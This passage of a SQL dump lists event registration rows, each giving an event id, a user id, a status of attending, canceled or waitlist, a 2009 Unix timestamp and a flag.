(235, 2736, 'canceled', 1233842476, '0'),
(235, 2921, 'canceled', 1233772514, '0'),
(237, 2073, 'attending', 1235750265, '1'),
(237, 2147, 'canceled', 1233085106, '0'),
(237, 2164, 'attending', 1234271907, '1'),
(237, 2229, 'attending', 1234978959, '1'),
(237, 2234, 'canceled', 1233691402, '0'),
(237, 2565, 'attending', 1235406475, '0'),
(237, 2603, 'canceled', 1233167969, '0'),
(237, 2637, 'attending', 1236268527, '1'),
(237, 2678, 'attending', 1234799855, '1'),
(237, 2788, 'attending', 1233801568, '1'),
(237, 2904, 'attending', 1236108065, '1'),
(237, 2923, 'attending', 1235868381, '1'),
(237, 2936, 'attending', 1234222770, '1'),
(238, 2073, 'attending', 1235750318, '1'),
(238, 2147, 'canceled', 1233085029, '0'),
(238, 2164, 'attending', 1234272441, '1'),
(238, 2222, 'canceled', 1236818537, '0'),
(238, 2296, 'attending', 1234815237, '0'),
(238, 2314, 'attending', 1235750023, '1'),
(238, 2351, 'canceled', 1236784508, '0'),
(238, 2402, 'attending', 1233258608, '1'),
(238, 2484, 'canceled', 1236818455, '0'),
(238, 2565, 'canceled', 1235406711, '0'),
(238, 2675, 'attending', 1234559081, '0'),
(238, 2678, 'canceled', 1234802560, '0'),
(238, 2788, 'attending', 1233802127, '1'),
(238, 2848, 'attending', 1236860051, '1'),
(238, 2904, 'attending', 1236108339, '1'),
(239, 2073, 'attending', 1235750347, '0'),
(239, 2147, 'attending', 1233085181, '0'),
(239, 2164, 'canceled', 1236047617, '0'),
(239, 2222, 'canceled', 1236818572, '0'),
(239, 2296, 'attending', 1234815323, '0'),
(239, 2484, 'canceled', 1236818700, '0'),
(239, 2675, 'attending', 1234559139, '0'),
(239, 2678, 'attending', 1234802635, '0'),
(239, 2788, 'attending', 1236962556, '1'),
(239, 2848, 'attending', 1237214382, '1'),
(240, 2148, 'attending', 1234891718, '1'),
(240, 2177, 'canceled', 1235580985, '0'),
(240, 2255, 'attending', 1233694216, '0'),
(240, 2296, 'attending', 1234207480, '0'),
(240, 2346, 'attending', 1236184387, '1'),
(240, 2370, 'attending', 1233689972, '1'),
(240, 2485, 'canceled', 1234275711, '0'),
(240, 2565, 'attending', 1235406621, '0'),
(240, 2596, 'attending', 1236377614, '1'),
(240, 2838, 'attending', 1236094260, '1'),
(240, 2893, 'attending', 1237216056, '1'),
(241, 2009, 'canceled', 1239104333, '0'),
(241, 2051, 'attending', 1235765113, '0'),
(241, 2197, 'canceled', 1236023602, '0'),
(241, 2222, 'canceled', 1236817871, '0'),
(241, 2232, 'attending', 1239111312, '1'),
(241, 2234, 'attending', 1236695532, '0'),
(241, 2262, 'canceled', 1239134858, '0'),
(241, 2307, 'canceled', 1237489469, '0'),
(241, 2335, 'attending', 1236951521, '1'),
(241, 2338, 'canceled', 1236795479, '0'),
(241, 2346, 'attending', 1236184015, '1'),
(241, 2382, 'attending', 1237318168, '1'),
(241, 2484, 'canceled', 1236818003, '0'),
(241, 2522, 'canceled', 1239204454, '0'),
(241, 2603, 'attending', 1237214189, '1'),
(241, 2608, 'attending', 1239197387, '1'),
(241, 2648, 'attending', 1237300113, '0'),
(241, 2721, 'attending', 1237216364, '1'),
(241, 2727, 'attending', 1235138284, '0'),
(241, 2785, 'attending', 1236268409, '1'),
(241, 2808, 'canceled', 1239205569, '0'),
(241, 2838, 'attending', 1236094388, '1'),
(241, 2886, 'attending', 1236267356, '1'),
(241, 2936, 'canceled', 1234222650, '0'),
(242, 2009, 'attending', 1239104389, '1'),
(242, 2081, 'attending', 1239738494, '1'),
(242, 2232, 'attending', 1237902410, '1'),
(242, 2234, 'canceled', 1236710352, '0'),
(242, 2307, 'canceled', 1237489493, '0'),
(242, 2338, 'canceled', 1236796341, '0'),
(242, 2346, 'attending', 1239221016, '\0'),
(242, 2382, 'attending', 1239289739, '1'),
(242, 2555, 'attending', 1238615801, '1'),
(242, 2565, 'canceled', 1235406821, '0'),
(242, 2580, 'canceled', 1236952130, '0'),
(242, 2608, 'attending', 1239221538, '1'),
(242, 2678, 'attending', 1236974343, '1'),
(242, 2721, 'attending', 1237216602, '1'),
(242, 2727, 'canceled', 1235138304, '0'),
(242, 2751, 'attending', 1235148102, '1'),
(242, 2785, 'attending', 1236269661, '1'),
(242, 2838, 'attending', 1236094450, '1'),
(242, 2886, 'attending', 1236267614, '1'),
(243, 2009, 'attending', 1239104449, '0'),
(243, 2081, 'attending', 1239894663, '1'),
(243, 2232, 'attending', 1239732961, '1'),
(243, 2251, 'canceled', 1233691289, '0'),
(243, 2307, 'canceled', 1237489550, '0'),
(243, 2314, 'attending', 1236999798, '0'),
(243, 2333, 'attending', 1237395814, '1'),
(243, 2338, 'canceled', 1236796448, '0'),
(243, 2346, 'attending', 1239221080, '0'),
(243, 2382, 'attending', 1239887300, '1'),
(243, 2603, 'attending', 1240233088, '1'),
(243, 2608, 'attending', 1239887645, '1'),
(243, 2678, 'attending', 1239733604, '1'),
(243, 2727, 'canceled', 1235138329, '0'),
(243, 2751, 'attending', 1235148152, '1'),
(243, 2785, 'attending', 1236269688, '1'),
(243, 2838, 'attending', 1236094499, '1'),
(243, 2886, 'attending', 1236267827, '1'),
(244, 2234, 'attending', 1236710250, '0'),
(244, 2235, 'attending', 1236281918, '1'),
(244, 2266, 'attending', 1238698584, '1'),
(244, 2307, 'canceled', 1237489644, '0'),
(244, 2346, 'attending', 1236182784, '1'),
(244, 2522, 'attending', 1238078091, '0'),
(244, 2660, 'attending', 1236612255, '0'),
(244, 2675, 'attending', 1234559349, '0'),
(244, 2678, 'attending', 1235159847, '0'),
(244, 2680, 'attending', 1236022191, '0'),
(244, 2704, 'attending', 1236014040, '0'),
(244, 2721, 'attending', 1237216494, '1'),
(244, 2835, 'canceled', 1235760520, '0'),
(244, 2874, 'attending', 1236788347, '1'),
(245, 2009, 'attending', 1236360573, '1'),
(245, 2122, 'attending', 1238424965, '1'),
(245, 2131, 'attending', 1234552056, '1'),
(245, 2148, 'attending', 1234891499, '1'),
(245, 2222, 'waitlist', 1236818758, '0'),
(245, 2243, 'attending', 1235598745, '1'),
(245, 2307, 'waitlist', 1237489335, '0'),
(245, 2335, 'canceled', 1236951423, '0'),
(245, 2338, 'waitlist', 1236796780, '0'),
(245, 2342, 'attending', 1236346047, '1'),
(245, 2363, 'attending', 1234883680, '1'),
(245, 2370, 'attending', 1234818702, '1'),
(245, 2377, 'canceled', 1236871739, '0'),
(245, 2488, 'attending', 1234619846, '1'),
(245, 2514, 'attending', 1234555889, '0'),
(245, 2565, 'attending', 1235406898, '0'),
(245, 2751, 'waitlist', 1239029573, '0'),
(245, 2756, 'canceled', 1234796006, '0'),
(245, 2773, 'waitlist', 1237163006, '0'),
(245, 2903, 'attending', 1236779294, '0'),
(245, 2904, 'attending', 1236108543, '1'),
(246, 2009, 'attending', 1236360756, '1'),
(246, 2122, 'attending', 1238425032, '1'),
(246, 2131, 'attending', 1234552189, '1'),
(246, 2147, 'canceled', 1233085255, '0'),
(246, 2148, 'canceled', 1234891919, '0'),
(246, 2164, 'attending', 1235418761, '1'),
(246, 2222, 'canceled', 1239111372, '0'),
(246, 2243, 'attending', 1235598565, '1'),
(246, 2307, 'canceled', 1238687936, '0'),
(246, 2338, 'canceled', 1236796907, '0'),
(246, 2363, 'attending', 1234883746, '1'),
(246, 2370, 'attending', 1234818741, '1'),
(246, 2377, 'canceled', 1236871705, '0'),
(246, 2488, 'attending', 1234620013, '1'),
(246, 2659, 'attending', 1239626755, '1'),
(246, 2756, 'canceled', 1234883811, '0'),
(246, 2773, 'canceled', 1237163248, '0'),
(246, 2904, 'attending', 1236108573, '1'),
(247, 2009, 'attending', 1236360786, '1'),
(247, 2081, 'waitlist', 1240235726, '0'),
(247, 2105, 'canceled', 1233084011, '0'),
(247, 2122, 'attending', 1238425070, '1'),
(247, 2131, 'attending', 1234552255, '1'),
(247, 2164, 'attending', 1236047302, '1'),
(247, 2222, 'canceled', 1239111791, '0'),
(247, 2243, 'attending', 1235598696, '1'),
(247, 2307, 'canceled', 1238687961, '0'),
(247, 2338, 'canceled', 1236797005, '0'),
(247, 2363, 'attending', 1234883811, '1'),
(247, 2370, 'attending', 1234818771, '0'),
(247, 2377, 'canceled', 1236871682, '0'),
(247, 2402, 'attending', 1233258680, '1'),
(247, 2488, 'attending', 1234620061, '1'),
(247, 2659, 'attending', 1240236483, '1'),
(247, 2773, 'canceled', 1237163296, '0'),
(247, 2827, 'attending', 1239626772, '1'),
(247, 2904, 'attending', 1236108613, '1'),
(248, 2008, 'attending', 1238522097, '1'),
(248, 2009, 'canceled', 1239801733, '0'),
(248, 2122, 'attending', 1238425111, '1'),
(248, 2131, 'attending', 1234552547, '1'),
(248, 2147, 'canceled', 1233085336, '0'),
(248, 2164, 'canceled', 1236047712, '0'),
(248, 2243, 'attending', 1235598673, '0'),
(248, 2307, 'canceled', 1237489424, '0'),
(248, 2363, 'attending', 1239380952, '1'),
(248, 2370, 'attending', 1234818806, '0'),
(248, 2377, 'canceled', 1236871568, '0'),
(248, 2488, 'attending', 1234620084, '1'),
(248, 2494, 'attending', 1238521863, '1'),
(248, 2659, 'attending', 1238687977, '1'),
(248, 2773, 'canceled', 1237163358, '0'),
(248, 2904, 'attending', 1236108653, '1'),
(249, 1985, 'canceled', 1233073755, '0'),
(249, 2033, 'attending', 1234196314, '1'),
(249, 2072, 'canceled', 1233691805, '0'),
(249, 2098, 'attending', 1233690139, '1'),
(249, 2110, 'waitlist', 1235761534, '0'),
(249, 2148, 'attending', 1237776351, '1'),
(249, 2189, 'attending', 1237229899, '1'),
(249, 2205, 'canceled', 1234545164, '0'),
(249, 2285, 'canceled', 1237574049, '0'),
(249, 2370, 'attending', 1233689606, '1'),
(249, 2448, 'attending', 1233690539, '1'),
(249, 2538, 'canceled', 1233692733, '0'),
(249, 2696, 'attending', 1233690422, '1'),
(249, 2722, 'canceled', 1233689955, '0'),
(249, 2757, 'canceled', 1234818237, '0'),
(249, 2787, 'canceled', 1233689585, '0'),
(249, 2788, 'attending', 1233691331, '1'),
(249, 2930, 'attending', 1237575400, '\0'),
(249, 2936, 'attending', 1233076505, '1'),
(251, 1997, 'canceled', 1239025446, '0'),
(251, 2000, 'attending', 1233693037, '1'),
(251, 2202, 'canceled', 1233689305, '0'),
(251, 2205, 'canceled', 1238786494, '0'),
(251, 2251, 'attending', 1233691216, '1'),
(251, 2340, 'attending', 1233690426, '1'),
(251, 2371, 'attending', 1239020751, '1'),
(251, 2448, 'attending', 1233691257, '1'),
(251, 2521, 'canceled', 1233691543, '0'),
(251, 2528, 'canceled', 1238881335, '0'),
(251, 2538, 'attending', 1233692974, '1'),
(251, 2596, 'canceled', 1239026319, '0'),
(251, 2602, 'attending', 1237776404, '1'),
(251, 2722, 'canceled', 1233689981, '0'),
(251, 2787, 'canceled', 1233689691, '0'),
(251, 2812, 'canceled', 1238862633, '0'),
(251, 2888, 'canceled', 1233689194, '0'),
(251, 2936, 'attending', 1233076682, '1'),
(252, 2000, 'attending', 1239049798, '1'),
(252, 2251, 'attending', 1239049529, '1'),
(252, 2340, 'attending', 1239049494, '1'),
(252, 2371, 'attending', 1239049924, '1'),
(252, 2448, 'attending', 1239049599, '1'),
(252, 2538, 'attending', 1239049642, '1'),
(252, 2602, 'attending', 1239049924, '1'),
(252, 2936, 'attending', 1239049461, '1'),
(253, 2038, 'waitlist', 1240950884, '0'),
(253, 2202, 'canceled', 1233689339, '0'),
(253, 2205, 'attending', 1238444522, '0'),
(253, 2251, 'attending', 1233691348, '0'),
(253, 2285, 'attending', 1241008485, '1'),
(253, 2340, 'attending', 1233690491, '1'),
(253, 2371, 'attending', 1240504917, '0'),
(253, 2438, 'canceled', 1233692342, '0'),
(253, 2448, 'attending', 1233692893, '1'),
(253, 2518, 'attending', 1233691933, '0'),
(253, 2538, 'canceled', 1237776423, '0'),
(253, 2596, 'canceled', 1239024255, '0'),
(253, 2608, 'attending', 1241027971, '0'),
(253, 2696, 'canceled', 1233690465, '0'),
(253, 2722, 'canceled', 1233690008, '0'),
(253, 2787, 'canceled', 1233689759, '0'),
(253, 2801, 'attending', 1233690096, '0'),
(253, 2812, 'attending', 1238786543, '0'),
(253, 2888, 'canceled', 1233689304, '0'),
(253, 2891, 'waitlist', 1240857332, '0'),
(253, 2936, 'attending', 1233076727, '0'),
(254, 2285, 'attending', 1241460667, '0'),
(254, 2340, 'attending', 1241460667, '0'),
(254, 2448, 'attending', 1241460668, '0'),
(255, 1991, 'attending', 1234548471, '1'),
(255, 2001, 'attending', 1233854018, '1'),
(255, 2032, 'attending', 1234467173, '1'),
(255, 2041, 'attending', 1234809902, '1'),
(255, 2165, 'attending', 1234548832, '1'),
(255, 2172, 'attending', 1233675302, '1'),
(255, 2234, 'attending', 1233691574, '1'),
(255, 2285, 'attending', 1234963773, '1'),
(255, 2290, 'attending', 1234546076, '1'),
(255, 2348, 'canceled', 1233691582, '0'),
(255, 2355, 'attending', 1234546310, '1'),
(255, 2358, 'attending', 1233676831, '1'),
(255, 2375, 'attending', 1233678261, '1'),
(255, 2443, 'attending', 1233934343, '1'),
(255, 2455, 'attending', 1233750068, '1'),
(255, 2507, 'attending', 1233674198, '0'),
(255, 2534, 'attending', 1234809902, '0'),
(255, 2618, 'attending', 1233688092, '1'),
(255, 2628, 'attending', 1233676463, '0'),
(255, 2725, 'attending', 1233837690, '1'),
(255, 2884, 'attending', 1233682129, '0'),
(255, 2887, 'attending', 1234546089, '1'),
(255, 2936, 'attending', 1233706328, '1'),
(256, 1985, 'attending', 1234545142, '1'),
(256, 1991, 'attending', 1234548504, '1'),
(256, 2001, 'attending', 1233854135, '1'),
(256, 2014, 'attending', 1234543622, '0'),
(256, 2041, 'attending', 1234794991, '1'),
(256, 2172, 'attending', 1233675403, '1'),
(256, 2190, 'attending', 1233748017, '1'),
(256, 2211, 'attending', 1233756940, '1'),
(256, 2234, 'attending', 1234810693, '1'),
(256, 2285, 'canceled', 1234472107, '0'),
(256, 2319, 'attending', 1233860653, '1'),
(256, 2363, 'attending', 1235497391, '0'),
(256, 2375, 'canceled', 1233678379, '0'),
(256, 2379, 'attending', 1233870164, '1'),
(256, 2416, 'canceled', 1233696250, '0'),
(256, 2436, 'attending', 1233868088, '1'),
(256, 2455, 'attending', 1233750206, '0'),
(256, 2507, 'attending', 1233676629, '0'),
(256, 2538, 'attending', 1233692474, '1'),
(256, 2546, 'attending', 1233674286, '1'),
(256, 2565, 'canceled', 1235507310, '0'),
(256, 2618, 'attending', 1233688192, '0'),
(256, 2668, 'attending', 1235051351, '1'),
(256, 2675, 'attending', 1234557091, '1'),
(256, 2696, 'canceled', 1233690556, '0'),
(256, 2729, 'attending', 1235591876, '1'),
(256, 2801, 'canceled', 1233690054, '0'),
(256, 2847, 'attending', 1233757035, '1'),
(256, 2884, 'attending', 1233682059, '0'),
(256, 2936, 'attending', 1233703450, '1'),
(257, 2051, 'attending', 1235764836, '1'),
(257, 2148, 'attending', 1234891809, '1'),
(257, 2235, 'canceled', 1235408339, '0'),
(257, 2288, 'attending', 1235758498, '1'),
(257, 2314, 'attending', 1235750329, '1'),
(257, 2363, 'attending', 1234883888, '1'),
(257, 2370, 'attending', 1234213162, '1'),
(257, 2398, 'attending', 1234185407, '1'),
(257, 2514, 'attending', 1234557117, '0'),
(257, 2565, 'attending', 1235406258, '0'),
(257, 2704, 'canceled', 1235759405, '0'),
(257, 2736, 'attending', 1233945172, '1'),
(257, 2835, 'attending', 1235760618, '0'),
(257, 2921, 'attending', 1234188289, '1'),
(258, 2031, 'attending', 1234890212, '0'),
(258, 2110, 'attending', 1234816225, '0'),
(258, 2205, 'attending', 1234045953, '0'),
(258, 2285, 'attending', 1234192064, '1'),
(258, 2421, 'canceled', 1235341187, '0'),
(258, 2538, 'attending', 1234147526, '1'),
(258, 2722, 'canceled', 1234561034, '0'),
(258, 2736, 'attending', 1234211804, '0'),
(258, 2753, 'attending', 1234549619, '0'),
(258, 2757, 'canceled', 1234818019, '0'),
(258, 2780, 'attending', 1234969164, '0'),
(258, 2788, 'attending', 1235494071, '0'),
(258, 2805, 'canceled', 1234811483, '0'),
(258, 2812, 'attending', 1234029340, '0'),
(258, 2825, 'canceled', 1235059769, '0'),
(258, 2930, 'canceled', 1234810399, '0'),
(259, 2086, 'canceled', 1235408933, '0'),
(259, 2307, 'attending', 1237489715, '0'),
(259, 2331, 'attending', 1238096654, '0'),
(259, 2351, 'attending', 1236861519, '1'),
(259, 2362, 'attending', 1234978701, '1'),
(259, 2374, 'attending', 1238278311, '1'),
(259, 2596, 'attending', 1238001085, '0'),
(259, 2648, 'attending', 1237299822, '0'),
(259, 2668, 'attending', 1235679719, '0'),
(259, 2755, 'attending', 1237663951, '1'),
(259, 2794, 'attending', 1237306491, '1'),
(260, 1996, 'attending', 1236799349, '1'),
(260, 2211, 'attending', 1236779630, '1'),
(260, 2228, 'attending', 1235749705, '1'),
(260, 2298, 'attending', 1236608236, '0'),
(260, 2351, 'canceled', 1236267007, '0'),
(260, 2539, 'attending', 1236612725, '1'),
(260, 2546, 'attending', 1236799349, '1'),
(260, 2652, 'attending', 1236021982, '1'),
(260, 2679, 'attending', 1236609219, '1'),
(260, 2726, 'canceled', 1236608654, '0'),
(260, 2742, 'canceled', 1236609462, '0'),
(260, 2787, 'attending', 1236288641, '1'),
(260, 2838, 'attending', 1236777233, '1'),
(260, 2847, 'attending', 1236780567, '1'),
(260, 2903, 'attending', 1236779006, '1'),
(261, 1990, 'attending', 1238778246, '1'),
(261, 2117, 'attending', 1236184719, '1'),
(261, 2167, 'attending', 1237294496, '1'),
(261, 2288, 'attending', 1235758850, '1'),
(261, 2336, 'attending', 1237817647, '1'),
(261, 2351, 'attending', 1236861046, '1'),
(261, 2397, 'attending', 1237341185, '0'),
(261, 2423, 'attending', 1237824773, '1'),
(261, 2443, 'attending', 1236953408, '1'),
(261, 2495, 'attending', 1236174195, '0'),
(261, 2539, 'canceled', 1236612910, '0'),
(261, 2540, 'attending', 1237820657, '1'),
(261, 2660, 'attending', 1236611529, '0'),
(261, 2668, 'attending', 1235679141, '1'),
(261, 2705, 'canceled', 1236611643, '0'),
(261, 2775, 'attending', 1237814348, '0'),
(261, 2843, 'attending', 1238778247, '0'),
(261, 2906, 'attending', 1236608603, '1'),
(262, 1991, 'attending', 1237385292, '1'),
(262, 1996, 'waitlist', 1236190464, '0'),
(262, 2171, 'attending', 1236173659, '1'),
(262, 2243, 'canceled', 1236173114, '0'),
(262, 2249, 'attending', 1236177277, '1'),
(262, 2272, 'canceled', 1236173113, '0'),
(262, 2282, 'attending', 1236173114, '1'),
(262, 2294, 'attending', 0, '1'),
(262, 2313, 'waitlist', 1236186193, '0'),
(262, 2354, 'attending', 1236173736, '1'),
(262, 2387, 'attending', 1236175684, '1'),
(262, 2389, 'attending', 1236173659, '1'),
(262, 2390, 'canceled', 1236190882, '0'),
(262, 2393, 'attending', 1236173658, '1'),
(262, 2407, 'attending', 1236173161, '1'),
(262, 2413, 'attending', 1236173658, '1'),
(262, 2419, 'attending', 0, '1'),
(262, 2420, 'waitlist', 1236717123, '0'),
(262, 2441, 'waitlist', 1237234630, '0'),
(262, 2471, 'attending', 0, '1'),
(262, 2532, 'waitlist', 1236526070, '0'),
(262, 2538, 'waitlist', 1236884745, '0'),
(262, 2568, 'attending', 1236173658, '1'),
(262, 2585, 'attending', 1236173113, '1'),
(262, 2627, 'attending', 1236173659, '0'),
(262, 2639, 'attending', 1236173114, '1'),
(262, 2650, 'attending', 1236173114, '1'),
(262, 2777, 'waitlist', 1237391698, '0'),
(262, 2856, 'attending', 1237170390, '1'),
(262, 2868, 'attending', 1236173658, '1'),
(262, 2872, 'waitlist', 1236346186, '0'),
(262, 2910, 'attending', 1236173114, '1'),
(263, 2033, 'attending', 1238080280, '1'),
(263, 2098, 'attending', 1238080279, '1'),
(263, 2148, 'canceled', 1238080280, '0'),
(263, 2189, 'attending', 1238080280, '1'),
(263, 2370, 'attending', 1238080279, '1'),
(263, 2448, 'attending', 1238080279, '1'),
(263, 2696, 'attending', 1238085018, '1'),
(263, 2788, 'canceled', 1238080279, '0'),
(263, 2930, 'canceled', 1238080280, '0'),
(263, 2936, 'attending', 1238085017, '1'),
(264, 1983, 'attending', 1239897621, '0'),
(264, 1985, 'canceled', 1239908245, '0'),
(264, 1991, 'canceled', 1239817031, '0'),
(264, 2055, 'attending', 1239798509, '1'),
(264, 2067, 'attending', 1239822931, '0'),
(264, 2068, 'attending', 1239814697, '1'),
(264, 2089, 'attending', 1239889379, '0'),
(264, 2133, 'attending', 1239830003, '0'),
(264, 2180, 'attending', 1239815046, '0'),
(264, 2242, 'attending', 1239815199, '0'),
(264, 2830, 'attending', 1239821794, '1'),
(264, 2928, 'attending', 1239820311, '1'),
(265, 2041, 'attending', 1239814443, '1'),
(265, 2090, 'attending', 1239818068, '1'),
(265, 2164, 'attending', 1239814749, '1'),
(265, 2165, 'attending', 1239801948, '1'),
(265, 2206, 'attending', 1239797948, '0'),
(265, 2208, 'attending', 1239221565, '1'),
(265, 2214, 'canceled', 1239799039, '0'),
(265, 2309, 'attending', 1239797171, '0'),
(265, 2338, 'attending', 1239820729, '1'),
(265, 2434, 'attending', 1239815494, '1'),
(265, 2583, 'attending', 1239815593, '1'),
(265, 2593, 'attending', 1239814408, '1'),
(265, 2661, 'attending', 1239802517, '1'),
(265, 2723, 'attending', 1239815030, '1'),
(265, 2733, 'attending', 1239821191, '1'),
(266, 1975, 'canceled', 1240933677, '0'),
(266, 1985, 'canceled', 1239907855, '0'),
(266, 2038, 'attending', 1240933845, '1'),
(266, 2096, 'attending', 1239996580, '1'),
(266, 2164, 'canceled', 1240338105, '0'),
(266, 2165, 'attending', 1239372742, '0'),
(266, 2172, 'attending', 1239376947, '1'),
(266, 2208, 'attending', 1239221654, '1'),
(266, 2234, 'canceled', 1239719834, '0'),
(266, 2348, 'attending', 1240497022, '1'),
(266, 2353, 'attending', 1240498928, '1'),
(266, 2375, 'attending', 1239883749, '1'),
(266, 2423, 'attending', 1240324622, '1'),
(266, 2429, 'attending', 1240347337, '1'),
(266, 2443, 'attending', 1239627545, '0'),
(266, 2459, 'attending', 1240516161, '1'),
(266, 2487, 'attending', 1239911880, '1'),
(266, 2652, 'attending', 1239372441, '0'),
(266, 2655, 'canceled', 1240843137, '0'),
(266, 2669, 'attending', 1240234123, '1'),
(266, 2732, 'attending', 1239911305, '1'),
(266, 2777, 'attending', 1240922127, '1'),
(266, 2904, 'attending', 1239628549, '0'),
(266, 2906, 'attending', 1239625201, '1'),
(267, 1985, 'canceled', 1239907804, '0'),
(267, 2081, 'attending', 1239979589, '1'),
(267, 2105, 'attending', 1241095253, '1'),
(267, 2184, 'attending', 1239970895, '1'),
(267, 2232, 'attending', 1239905913, '0'),
(267, 2363, 'canceled', 1240917552, '0'),
(267, 2397, 'attending', 1239223477, '0'),
(267, 2570, 'attending', 1241438760, '1'),
(267, 2598, 'attending', 1239627526, '1'),
(267, 2651, 'canceled', 1241182935, '0'),
(267, 2731, 'attending', 1239223841, '1'),
(267, 2859, 'attending', 1240327226, '0'),
(267, 2865, 'attending', 1241113514, '1'),
(267, 2906, 'attending', 1239624805, '1'),
(268, 2015, 'canceled', 1240926492, '0'),
(268, 2057, 'canceled', 1241038138, '0'),
(268, 2081, 'attending', 1240421166, '1'),
(268, 2083, 'canceled', 1241105766, '0'),
(268, 2115, 'attending', 1239818667, '1'),
(268, 2238, 'attending', 1239734031, '1'),
(268, 2259, 'attending', 1240837916, '1'),
(268, 2263, 'attending', 1239734799, '1'),
(268, 2554, 'attending', 1240261620, '1'),
(268, 2577, 'attending', 1239734619, '1'),
(268, 2664, 'attending', 1239830014, '1'),
(268, 2678, 'attending', 1239732780, '1'),
(269, 1991, 'attending', 1239887403, '1'),
(269, 1996, 'attending', 1241551383, '1'),
(269, 2005, 'attending', 1239815451, '1'),
(269, 2035, 'attending', 1239882533, '1'),
(269, 2096, 'attending', 1239817943, '1'),
(269, 2119, 'attending', 1241105635, '1'),
(269, 2202, 'attending', 1239826018, '1'),
(269, 2348, 'canceled', 1240496943, '0'),
(269, 2433, 'attending', 1239974192, '1'),
(269, 2462, 'attending', 1239909054, '0'),
(269, 2469, 'attending', 1241033502, '0'),
(269, 2563, 'attending', 1239816783, '1'),
(269, 2655, 'attending', 1240842654, '1'),
(269, 2663, 'attending', 1239973689, '1'),
(269, 2669, 'attending', 1240234317, '1'),
(269, 2777, 'attending', 1240842126, '1'),
(271, 1977, 'attending', 1240874272, '0'),
(271, 1995, 'attending', 1240599015, '0'),
(271, 2054, 'canceled', 1240591675, '0'),
(271, 2065, 'attending', 1240837775, '0'),
(271, 2066, 'attending', 1240585953, '0'),
(271, 2082, 'attending', 1240591181, '0'),
(271, 2093, 'attending', 1240587894, '0'),
(271, 2099, 'attending', 1240586230, '0'),
(271, 2135, 'attending', 1240417021, '0'),
(271, 2150, 'attending', 1240597954, '0'),
(271, 2157, 'attending', 1240588241, '0'),
(271, 2284, 'attending', 1240596415, '0'),
(271, 2289, 'attending', 1240591325, '0'),
(271, 2313, 'attending', 1240847578, '0'),
(271, 2366, 'attending', 1240588413, '0'),
(271, 2527, 'attending', 1240889982, '0'),
(271, 2564, 'attending', 1240611887, '0'),
(271, 2623, 'attending', 1240611982, '0'),
(271, 2629, 'attending', 1240597715, '0'),
(271, 2673, 'attending', 1240835005, '0'),
(271, 2777, 'attending', 1240585858, '0'),
(271, 2813, 'attending', 1240586025, '0'),
(271, 2866, 'canceled', 1240585996, '0'),
(271, 2887, 'attending', 1240338750, '0'),
(271, 2892, 'attending', 1240587576, '0'),
(271, 2917, 'attending', 1240772531, '0'),
(271, 2938, 'canceled', 1240588205, '0'),
(272, 2015, 'canceled', 1240926567, '0'),
(272, 2064, 'canceled', 1242060447, '0'),
(272, 2091, 'attending', 1241194657, '0'),
(272, 2100, 'attending', 1241441077, '0'),
(272, 2111, 'canceled', 1242049056, '0'),
(272, 2116, 'attending', 1241791674, '0'),
(272, 2153, 'attending', 1240862574, '0'),
(272, 2315, 'attending', 1240921525, '0'),
(272, 2341, 'attending', 1240929532, '0'),
(272, 2531, 'attending', 1241721582, '0'),
(272, 2538, 'attending', 1241692228, '0'),
(272, 2586, 'attending', 1241118241, '0'),
(272, 2928, 'attending', 1240857850, '0'),
(273, 2029, 'attending', 1242053196, '0'),
(273, 2189, 'canceled', 1240921621, '0'),
(273, 2276, 'attending', 1240951547, '0'),
(273, 2477, 'attending', 1241466235, '0'),
(273, 2583, 'attending', 1241798854, '0'),
(273, 2595, 'attending', 1240928227, '0'),
(273, 2676, 'attending', 1241438634, '0'),
(273, 2736, 'attending', 1240858227, '0'),
(273, 2814, 'attending', 1241208089, '0'),
(273, 2823, 'attending', 1240860575, '0'),
(273, 2845, 'attending', 1240857952, '0'),
(273, 2935, 'attending', 1240951422, '0'),
(274, 2111, 'attending', 1242053937, '0'),
(274, 2164, 'attending', 1240922276, '0'),
(274, 2202, 'attending', 1242150291, '0'),
(274, 2566, 'attending', 1241718586, '0'),
(275, 2189, 'attending', 1241010004, '0'),
(275, 2244, 'attending', 1241697576, '0'),
(275, 2347, 'attending', 1241812837, '0'),
(275, 2616, 'attending', 1241117685, '0'),
(275, 2625, 'attending', 1241822668, '0'),
(276, 2208, 'attending', 1240851866, '0'),
(276, 2216, 'canceled', 1240615601, '0'),
(276, 2737, 'attending', 1240932444, '0'),
(276, 2904, 'attending', 1240846025, '0'),
(279, 2347, 'canceled', 1241812739, '0'),
(280, 2797, 'attending', 1241730357, '0'),
(282, 2037, 'canceled', 1241180872, '0'),
(282, 2078, 'attending', 1241116711, '0'),
(282, 2161, 'attending', 1241530017, '0'),
(282, 2208, 'attending', 1240851742, '0'),
(282, 2231, 'attending', 1241571211, '0'),
(282, 2266, 'attending', 1241120108, '0'),
(282, 2328, 'attending', 1241447830, '0'),
(282, 2463, 'attending', 1241701586, '0'),
(282, 2520, 'attending', 1241466638, '0'),
(282, 2529, 'attending', 1241205655, '0'),
(282, 2676, 'canceled', 1241438280, '0'),
(282, 2789, 'attending', 1241454492, '0'),
(282, 2797, 'attending', 1240928695, '0'),
(282, 2879, 'attending', 1240858844, '0'),
(283, 2108, 'canceled', 1240858792, '0'),
(283, 2254, 'canceled', 1241182510, '0'),
(283, 2327, 'canceled', 1242062667, '0'),
(283, 2423, 'canceled', 1241810558, '0'),
(283, 2573, 'canceled', 1241980830, '0'),
(284, 1994, 'attending', 1241704878, '0'),
(284, 2028, 'attending', 1240942094, '0'),
(284, 2143, 'attending', 1241558348, '0'),
(284, 2427, 'attending', 1241814671, '0'),
(284, 2456, 'attending', 1241699726, '0'),
(284, 2523, 'attending', 1241033403, '0'),
(284, 2607, 'attending', 1240858597, '0'),
(284, 2670, 'attending', 1240942094, '0'),
(284, 2778, 'attending', 1240920991, '0'),
(285, 2279, 'canceled', 1241112418, '0'),
(285, 2500, 'canceled', 1241117103, '0'),
(286, 2064, 'attending', 1242152975, '0'),
(286, 2080, 'attending', 1241185585, '0'),
(286, 2327, 'attending', 1242131872, '0'),
(286, 2384, 'attending', 1242152974, '0'),
(287, 2052, 'attending', 1240861824, '0'),
(287, 2659, 'attending', 1241697068, '0'),
(288, 2200, 'attending', 1242159250, '0'),
(288, 2844, 'attending', 1242063793, '0'),
(289, 2037, 'attending', 1241022051, '0'),
(289, 2081, 'attending', 1241617934, '0'),
(289, 2158, 'attending', 1241445485, '0'),
(289, 2196, 'attending', 1241008445, '0'),
(289, 2212, 'attending', 1241552748, '0'),
(289, 2232, 'attending', 1240859747, '0'),
(289, 2574, 'attending', 1240858378, '0'),
(289, 2656, 'attending', 1240856616, '0'),
